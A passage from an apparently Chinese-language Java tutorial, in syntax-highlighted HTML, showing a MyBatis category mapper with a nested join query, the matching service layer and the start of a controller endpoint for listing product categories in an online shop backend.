keyword">extends</span> <span class="token class-name">GeneralDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Category</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>    <span class="token comment">//1.连接查询</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">CategoryVO</span><span class="token punctuation">&gt;</span></span> <span class="token function">selectAllCategories</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//2.子查询：根据parentId查询子分类</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">CategoryVO</span><span class="token punctuation">&gt;</span></span> <span class="token function">selectAllCategories2</span><span class="token punctuation">(</span><span class="token keyword">int</span> parentId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>映射配置</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span> <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.dao.CategoryMapper<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>BaseResultMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.entity.Category<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_id<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_name<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryName<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_level<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryLevel<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parent_id<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parentId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_icon<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryIcon<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_slogan<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categorySlogan<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_pic<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryPic<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_bg_color<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryBgColor<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryVOMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.entity.CategoryVO<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_id1<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_name1<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryName<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_level1<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryLevel<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parent_id1<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parentId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_icon1<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryIcon<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_slogan1<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categorySlogan<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_pic1<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryPic<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_bg_color1<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryBgColor<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collection</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categories<span class="token punctuation">"</span></span> <span class="token attr-name">ofType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.entity.CategoryVO<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_id2<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_name2<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryName<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_level2<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryLevel<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parent_id2<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parentId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collection</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categories<span class="token punctuation">"</span></span>  <span class="token attr-name">ofType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.entity.CategoryVO<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_id3<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_name3<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryName<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_level3<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryLevel<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parent_id3<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parentId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>collection</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>collection</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAllCategories<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryVOMap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    select      c1.category_id 'category_id1',      c1.category_name 'category_name1',      c1.category_level 'category_level1',      c1.parent_id 'parent_id1',      c1.category_icon 'category_icon1',      c1.category_slogan 'category_slogan1',      c1.category_pic 'category_pic1',      c1.category_bg_color 'category_bg_color1',      c2.category_id 'category_id2',      c2.category_name 'category_name2',      c2.category_level 'category_level2',      c2.parent_id 'parent_id2',      c3.category_id 'category_id3',      c3.category_name 'category_name3',      c3.category_level 'category_level3',      c3.parent_id 'parent_id3'    from category c1           inner join category c2                      on c2.parent_id=c1.category_id           left join category c3                     on c3.parent_id=c2.category_id    where c1.category_level=1  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!----------------------------------------------------------------------------&gt;</span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryVOMap2<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.entity.CategoryVO<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_id<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_name<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryName<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_level<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryLevel<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parent_id<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parentId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_icon<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryIcon<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_slogan<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categorySlogan<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_pic<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryPic<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_bg_color<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryBgColor<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collection</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categories<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_id<span class="token punctuation">"</span></span> <span class="token attr-name">select</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.dao.CategoryMapper.selectAllCategories2<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 根据父级分类的id查询子级分类  --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAllCategories2<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryVOMap2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        select            category_id,            category_name,            category_level,            parent_id,            category_icon,            category_slogan,            category_pic,            category_bg_color        from category        where parent_id=#{parentId}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="9-2-2-业务层实现"><a href="#9-2-2-业务层实现" class="headerlink" title="9.2.2 业务层实现"></a>9.2.2 业务层实现</h6><ul><li><p>CategoryService接口</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">CategoryService</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listCategories</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>CategoryServiceImpl</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CategoryServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">CategoryService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">CategoryMapper</span> categoryMapper<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listCategories</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">CategoryVO</span><span class="token punctuation">&gt;</span></span> categoryVOS <span class="token operator">=</span> categoryMapper<span class="token punctuation">.</span><span class="token function">selectAllCategories</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">,</span> categoryVOS<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="9-2-3-控制层实现"><a href="#9-2-3-控制层实现" class="headerlink" title="9.2.3 控制层实现"></a>9.2.3 控制层实现</h6><ul><li><p>IndexController</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Autowired</span><span class="token keyword">private</span> <span class="token class-name">CategoryService</span> categoryService<span class="token punctuation">;</span><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/category-list"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"商品分类查询接口"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listCatetory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> categoryService<span class="token punctuation">.</span><span class="token function">listCategories</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 